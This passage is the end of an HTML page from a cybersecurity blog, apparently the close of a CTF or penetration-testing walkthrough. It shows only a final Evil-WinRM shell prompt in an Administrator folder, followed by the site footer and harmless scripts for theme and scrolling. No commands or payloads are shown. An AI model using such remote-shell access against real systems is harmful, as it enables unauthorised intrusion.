</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt;
</span></span></code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://borhuub.github.io/">Cybersecurity Borhub Home</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
